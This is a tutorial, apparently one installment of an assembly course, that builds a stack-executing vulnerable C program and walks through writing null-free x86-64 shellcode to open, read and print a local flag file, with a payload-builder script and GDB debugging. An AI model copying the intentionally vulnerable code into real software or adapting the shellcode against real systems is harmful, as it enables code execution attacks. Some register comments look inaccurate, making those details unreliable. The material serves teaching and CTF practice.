# A Challenge
Given the following C code can we write input that will actually be executed and *do something* like read a flag?
```C 
#include <string.h>
#include <unistd.h>

int main(int argc, char* argv[]){
	char* code[250];
	memset(code, 0, 250);
	
	read(0, code, 250);
	((void*)())code)(); // treat the code as a pointer to a function and run it
	return 0;
}

```
**To make this work we have to compile with specific flags to enable executing code from the stack. DONT DO THIS IN ANY OTHER CIRCUMSTANCES THIS IS SPECIFICALLY NOT INCLUDED SO THESE KINDS OF SECURITY VULNERABILITIES ARE MITIGATED**
Saving this code as vuln1.c we can create a target vulnerable binary using: 
```sh
gcc -g -z execstack -fno-stack-protector vuln1.c -o vuln1
```

## Creating Shell code
Well, if we want to read a flag we will need to first open a file, read it, and then write to STDOUT. 
We can start trying to craft a program in assembly to do exactly this, somewhat like the cat.asm program from 0x1.

And if we want any of this to happen when we pipe a raw stream of bits into the program we will need to manipulate the 
compiled and linked assembly. 

This kind of code is often called **shellcode** and it has unique qualities. For one, shell code has to be position
independent. Since we have no control of whats happening before our code is injected it must keep track of itself 
so as to not care about things like hardcoded or specific offsets in memory which will change randomly. 

Shellcode must also have null bytes removed, otherwise our stream of bits will have a NULL termination somewhere in it and 
will be incorrectly treated as a [string](https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html)

I write a small shell script for testing out different Assembly, take the compiled output and remove the NULL bytes,
write this data to a "payload" file, and then pipe that payload into the vuln1 program:

```bash
#!/bin/bash

binaryPayload=$1
targetBinary=$2

nasm -f elf64 $1 -o runme.o
ld -s runme.o -o runme
rm runme.o

shellcode=$(objdump -d runme | grep -Po '\s\K[a-f0-9]{2}(?=\s)' | sed 's/^/\\x/g' | perl -pe 's/\r?\n//' | sed 's/$/\n/')

echo 'open("payload","wb").write(b'"'"$shellcode"'"')' >> maker.py
python3 maker.py 
rm maker.py

# now pipe the shell code into our target and trace the system calls with strace
cat payload | strace ./$targetBinary
#EOF
```

Before reading a flag maybe lets try something simple, like.... printing a message to the console? 
We wrote code for echoing user supplied arguments in 0x1, but this is a bit different (also 64bit now). 

First thing we need to do is move the bytes of our message into memory. The write syscall is exepecting 
a pointer to our message to be in rdi. The rdx register needs to hold the length of our output. 
We also need to put out file descriptor for STDOUT (just 1) into rbx, and then move the value for the WRITE
syscall into rax. So can we try this?: 
```nasm
section .text
	global _start 
	
_start: 
	; move our message into memory
	xor rdi, rdi
	xor rcx, rcx 
	add rdi, 0x33323130 ;'0123'
	mov [rsi], rdi
	; the write syscall
	mov rdx, 5
	mov rax, 1
	mov rdi, 1
	syscall
	; exit
	xor rax, rax
	add al, 60
	syscall
```

*Lets try out our testshell script and save this as echo.asm:*


![echooo](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/helloShell.png)

By the way to figure out which registers need which arguments for every syscall you can find a table like this 

![syscalls](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/syscall_conventions.png)

from a website like [this](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)

Awesome it worked! Okay so how about trying to read a flag or something?... more syscalls xD 

This one required a bit of thinking, because unlike the cat.asm program in 0x2 we can't setup
a local buffer to read into.  

First we meed to move the name of the file "flag.txt" into memory, and open it (Remember our byte order must be reversed because of how data is stored and read from the stack). 
That should be similar to the cat.asm program but slightly borrowing from what we just did: 
```nasm
_start: 
	xor rdi, rdi
	xor rcx, rcx
	mov rdi, 0x7478742e67616c66 	;txt.galf 
	mov [rdx], rsi
	xchg rdi, rdx
```
So we already have our filename now in rdi, now we just need to move the READ syscall number (2) into RAX and the file permissions mask into RDX
```nasm
	add al, 2
	xor rsi, rsi 
	mov rdx, 0777o
```
If were to just add an exit after this we should be able to see in strace whether we've opened 
the correct file for reading though: 

![missingNull](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/openFlagNoNullTermination.png)


Ahh interesting, the filename is getting mangled somehow. Well 'flag.txt' is 8 bytes,
and at 9th byte we can see from strace that we have an f instead of a null byte. ASCII 'f' in hex is 0x66, so lets just subtract that value:

![fopen](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/FixingFileOpen.png)

**AWESOME IT WORKED!** 

So it looks like now we need to move the pointer to the file we just opened into rdi. Well using GDB I can see that its left in rax after the syscall.
Because we can't create a local buffer we could just use the space of the filename we created to hold the contents of what we read from the file?
So lets move that from the stack (rsp) into rsi. Finally we need to move the length of the message into rdx (we made the flag file so we know its 27 bytes): 

![fileRead](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/FileRead.png)

**AYYY IT WORKED!** 

Okay now we just need to print the result! We can do that with the write syscall, which expects rdi to have file descriptor of where to write (in this case STDOUT or 1).

Lets take a look at how we can debug this from GDB, here we can see the disassembly of the vuln1 main function:

![disass](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/disassMain.png) 

also we cam set a breakpoint for where our code will be called (seen above). Then lets run our program and pipe in the results from "payload" file using this syntax:
`r < payload` in the GDB terminal.

From here we can use stepi once to hop into and through our shellcode one instruction at a time! 

![gdb](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/StepIn.png)

lets use this visibilty to figure out how we can close the loop and actually write the contents of this flag file out. 
Stepping through our shellcode we can see that after the READ syscall we have the flag contents in RSI, which is already where we need our pointer to be for the WRITE CALL! 
The size is already in RDX from the READ call (which is the same place as WRITE), so all we need to do is:
	- Adjust RAX to be 1 for the WRITE syscall
	- change the file descriptor in RDI to 1 now because we want to write to STDOUT (before we read from an actual file)

![soClose](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/SoClose.png) 

well looking at GDB we can see RAX is 0x1b, so lets just subtract 0x1a. And then we can move 1 into rdi. And Voila!

![yay](https://raw.githubusercontent.com/cas1m1r/EDU/main/Assembly/0x4/success.png)
